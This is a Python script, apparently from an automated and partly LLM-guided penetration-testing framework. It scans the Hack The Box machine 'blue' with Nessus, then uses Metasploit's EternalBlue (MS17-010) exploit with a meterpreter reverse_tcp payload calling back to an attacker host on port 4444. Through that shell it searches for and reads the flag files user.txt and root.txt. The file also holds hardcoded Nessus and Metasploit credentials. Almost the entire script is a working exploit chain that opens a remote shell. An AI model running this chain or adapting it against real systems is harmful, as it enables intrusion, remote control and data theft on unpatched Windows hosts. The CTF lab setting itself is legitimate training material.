from attack_executor.scan.nessus_scanning import NessusScanner
from attack_executor.scan.nessus_parser import NessusExploitParser
from attack_executor.exploit.Metasploit import MetasploitExecutor



# Action 0: Set up the environment
# Box settings
BOXNAME = "blue" 
RHOST = "10.10.10.40"
LHOST = "10.10.14.12"
LPORT = "4444"
FILE_NAMES = ["user.txt", "root.txt"]
 
# Nessus settings
NESSUS_SERVER = "https://localhost:15858"
USERNAME = "root"
PASSWORD = "root"
OUTPUT_DIR = "nessus_raw_data"

# Metasploit settings
MSF_PASSWORD = 'glycNshR'
MSF_SERVER = '127.0.0.1'
MSF_PORT = 55552



# Action 1: Scan the target
try:
    scanner = NessusScanner(NESSUS_SERVER, USERNAME, PASSWORD)
    output_file = scanner.perform_complete_scan(RHOST, boxname=BOXNAME, output_dir=OUTPUT_DIR)
    
    if output_file:
        print(f"\n[SUCCESS] Raw scan data saved to: {output_file}")
    
    scanner.logout()
            
except Exception as e:
    print(f"[!] Error: {e}")
    import traceback
    traceback.print_exc()

# Action 2: Analyze the scan data
parser = NessusExploitParser(output_file)
    
# Perform analysis
saved_files = parser.analyze_raw_data(OUTPUT_DIR)

if saved_files:
    print(f"\n[SUCCESS] Analysis completed successfully!")
    print(f"[FILES] Generated files:")
    for file_type, filepath in saved_files.items():
        print(f"  - {file_type.title()}: {filepath}")
else:
    print(f"\n[INFO] No vulnerabilities with exploit frameworks found in the scan data.")

# Action 3: Exploit the target after getting the exploit framework from LLM analysis
metasploit_executor = MetasploitExecutor(MSF_PASSWORD, MSF_SERVER, MSF_PORT)

metasploit_executor.set_exploit_module("windows/smb/ms17_010_eternalblue", RHOST)
metasploit_executor.set_payload_module("windows/x64/meterpreter/reverse_tcp", LHOST, LPORT)

# Action 4: Execute the exploit
metasploit_executor.run()

# Action 5: Get the flag
for file in FILE_NAMES:
    print(f"Finding {file}")
    file_loc = metasploit_executor.communicate_with_meterpreter_session(
        input_text = f"search -f {file}"
        )
    file_name = metasploit_executor.extract_filename(file_loc)
    file_content = metasploit_executor.communicate_with_meterpreter_session(
        input_text = f"cat '{file_name}'"
        )
    print(f"Here is the content of {file}: {file_content}")

